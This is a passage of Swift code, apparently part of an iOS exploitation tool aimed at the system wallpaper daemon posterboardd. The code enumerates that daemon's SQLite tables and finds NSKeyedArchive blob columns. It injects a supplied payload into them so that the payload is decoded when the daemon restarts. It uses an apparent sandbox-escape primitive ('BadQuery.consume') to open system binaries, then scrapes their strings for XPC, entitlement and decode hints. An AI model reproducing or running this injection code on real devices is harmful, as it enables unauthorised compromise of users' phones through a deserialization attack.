                var rowStmt: OpaquePointer?
                if sqlite3_prepare_v2(db, "SELECT * FROM \"\(tname)\" LIMIT 5", -1, &rowStmt, nil) == SQLITE_OK {
                    let colCount = sqlite3_column_count(rowStmt)
                    var blobColIdx: Int32 = -1
                    while sqlite3_step(rowStmt) == SQLITE_ROW {
                        var parts: [String] = []
                        for i in 0..<colCount {
                            let col = String(cString: sqlite3_column_name(rowStmt, i))
                            switch sqlite3_column_type(rowStmt, i) {
                            case SQLITE_TEXT:
                                let v = String(cString: sqlite3_column_text(rowStmt, i))
                                parts.append("\(col)='\(v.prefix(60))'")
                            case SQLITE_INTEGER:
                                parts.append("\(col)=\(sqlite3_column_int64(rowStmt, i))")
                            case SQLITE_BLOB:
                                let sz = sqlite3_column_bytes(rowStmt, i)
                                var tag = "[blob \(sz)b]"
                                if sz >= 6, let ptr = sqlite3_column_blob(rowStmt, i) {
                                    let hdr = Data(bytes: ptr, count: min(8, Int(sz)))
                                    let hdrHex = hdr.map { String(format: "%02x", $0) }.joined()
                                    tag += " hdr=\(hdrHex)"
                                    if String(data: hdr.prefix(6), encoding: .ascii) == "bplist" {
                                        tag += " *** NSKeyedArchive ***"
                                        blobColIdx = i
                                    }
                                }
                                parts.append("\(col)=\(tag)")
                            case SQLITE_NULL:
                                parts.append("\(col)=NULL")
                            default:
                                parts.append("\(col)=?")
                            }
                        }
                        diag.append("      row: \(parts.joined(separator: " | "))")
                    }
                    sqlite3_finalize(rowStmt)

                    // If we found a NSKeyedArchive blob column AND we have a payload, try injecting
                    if let payload = payload, blobColIdx >= 0 {
                        var colNameStmt: OpaquePointer?
                        if sqlite3_prepare_v2(db, "SELECT * FROM \"\(tname)\" LIMIT 1", -1, &colNameStmt, nil) == SQLITE_OK,
                           sqlite3_step(colNameStmt) == SQLITE_ROW {
                            let blobCol = String(cString: sqlite3_column_name(colNameStmt, blobColIdx))
                            diag.append("    *** NSKeyedArchive blob in \(tname).\(blobCol) — attempting injection ***")
                            let injectSQL = "UPDATE \"\(tname)\" SET \"\(blobCol)\" = ? WHERE rowid = (SELECT rowid FROM \"\(tname)\" LIMIT 1)"
                            var injectStmt: OpaquePointer?
                            if sqlite3_prepare_v2(db, injectSQL, -1, &injectStmt, nil) == SQLITE_OK {
                                payload.withUnsafeBytes { buf in
                                    // SQLITE_TRANSIENT = (sqlite3_destructor_type)-1 — not bridged as Swift constant
                                    let transient = unsafeBitCast(-1, to: sqlite3_destructor_type.self)
                                    sqlite3_bind_blob(injectStmt, 1, buf.baseAddress, Int32(payload.count), transient)
                                }
                                let rc = sqlite3_step(injectStmt)
                                let affected = sqlite3_changes(db)
                                diag.append("    inject rc=\(rc) rows_affected=\(affected)")
                                if rc == SQLITE_DONE && affected > 0 {
                                    diag.append("    INJECTION SUCCESS — restart posterboardd to trigger decode")
                                }
                            }
                            sqlite3_finalize(injectStmt)
                        }
                        sqlite3_finalize(colNameStmt)
                    }
                }
            }
        }
        sqlite3_finalize(stmt)
    }

    private static func pbReadBinaryStrings(fm: FileManager, diag: inout [String]) {
        for binPath in ["/usr/libexec/posterboardd", "/usr/sbin/posterboardd",
                        "/usr/libexec/posterboardd.development"] {
            guard let bh = try? BadQuery.consume(path: binPath, create: true) else {
                diag.append("  \(binPath): CONSUME FAIL"); continue
            }
            defer { bh.release() }
            guard let data = fm.contents(atPath: binPath), data.count > 0 else {
                diag.append("  \(binPath): read FAIL"); continue
            }
            diag.append("  \(binPath): \(data.count) bytes")

            var cur: [UInt8] = []; var extracted: [String] = []
            for byte in data {
                if byte >= 32 && byte < 127 { cur.append(byte) }
                else {
                    if cur.count >= 8, let s = String(bytes: cur, encoding: .ascii) {
                        let l = s.lowercased()
                        if l.contains("import") || l.contains("archive") || l.contains("decode") ||
                           l.contains("sqlite") || l.contains("posterboard") || l.contains("wallpaper") ||
                           l.contains("darwin") || l.contains("notify") || l.contains("mutat") ||
                           l.contains("xpc") || l.contains("entitlement") ||
                           (s.hasPrefix("com.apple.") && s.count > 15) ||
                           s.hasPrefix("/var/") || s.hasPrefix("/Library/") {
                            extracted.append(s)
                        }
                    }
                    cur.removeAll(keepingCapacity: true)
                }
            }
            diag.append("  strings[\(extracted.count)]:")
            for s in extracted.prefix(500) { diag.append("    \(s)") }
            break  // only need one binary
        }
    }
}
